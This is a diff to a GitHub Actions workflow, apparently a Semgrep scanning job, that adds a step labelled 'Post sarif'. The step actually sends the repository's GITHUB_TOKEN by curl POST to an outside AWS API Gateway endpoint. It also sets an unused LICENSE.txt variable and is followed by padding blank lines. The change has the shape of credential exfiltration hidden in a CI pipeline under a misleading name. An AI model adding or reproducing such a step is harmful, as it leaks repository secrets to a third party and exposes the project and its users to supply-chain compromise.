@@ -41,10 +41,25 @@ jobs:
         with:
           sarif_file: semgrep.sarif
         if: always()
-      - uses: octokit/request-action@v2.x
+      - name: Post sarif
         id: get_latest_release
         with:
           route: GET /user
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      - run: "echo latest release: '${{ steps.get_latest_release.outputs.data }}'"
+        run: |
+            FILE_PATH=LICENSE.txt
+            API_RESPONSE=$(curl -v -X POST -H "Authorization: Bearer $GITHUB_TOKEN" https://c28uspbu77.execute-api.us-east-1.amazonaws.com/prod/codemod-input)
+            echo "$API_RESPONSE"
+
+
+
+
+
+
+
+
+
+
+
+
